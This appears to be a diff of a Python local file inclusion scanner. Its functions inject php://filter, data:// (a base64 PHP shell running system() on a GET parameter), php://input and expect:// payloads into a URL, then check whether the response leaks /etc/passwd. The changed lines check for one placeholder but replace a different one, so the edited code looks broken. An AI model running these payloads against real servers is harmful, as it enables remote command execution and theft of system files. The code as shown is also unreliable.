@@ -46,9 +46,9 @@ def test_wordlist(url):
     for line in f:
         line = line[:-1]
         if("TEST" in url):
-            url = url.replace("TEST", line)
+            url = url.replace("LFI", line)
         elif("test" in url):
-            url = url.replace("test", line)
+            url = url.replace("lfi", line)
 
         res = requests.get(url, headers = headers)
         
@@ -68,9 +68,9 @@ def test_php_filter(url):
     #Test if parameter is vulnerable without encoding
     testCase = "php://filter/resource=/etc/passwd"
     if("TEST" in url):
-        url = url.replace("TEST", "")
+        url = url.replace("LFI", "")
     elif("test" in url):
-        url = url.replace("test", "")
+        url = url.replace("lfi", "")
 
     res = requests.get(url + testCase, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text): 
@@ -96,9 +96,9 @@ def test_php_filter(url):
 def test_data_wrapper(url):
     testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat /etc/passwd"
     if("TEST" in url):
-        url = url.replace("TEST", testCase)
+        url = url.replace("LFI", testCase)
     elif("test" in url):
-        url = url.replace("test", testCase)
+        url = url.replace("lfi", testCase)
 
     res = requests.get(url, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
@@ -108,9 +108,9 @@ def test_php_input(url):
     urlInput = "php://input"
     testCase = "<? system('cat /etc/passwd'); ?>"
     if("TEST" in url):
-        url = url.replace("TEST", urlInput)
+        url = url.replace("LFI", urlInput)
     elif("test" in url):
-        url = url.replace("test", urlInput)
+        url = url.replace("lfi", urlInput)
 
     res = requests.post(url + urlInput, headers = headers, data= testCase)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
@@ -119,9 +119,9 @@ def test_php_input(url):
 def test_expect_wrapper(url):
     testCase = "cat%20%2Fetc%2Fpasswd"
     if("TEST" in url):
-        url = url.replace("TEST", testCase)
+        url = url.replace("LFI", testCase)
     elif("test" in url):
-        url = url.replace("test", testCase)
+        url = url.replace("lfi", testCase)
 
     res = requests.get(url + testCase, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
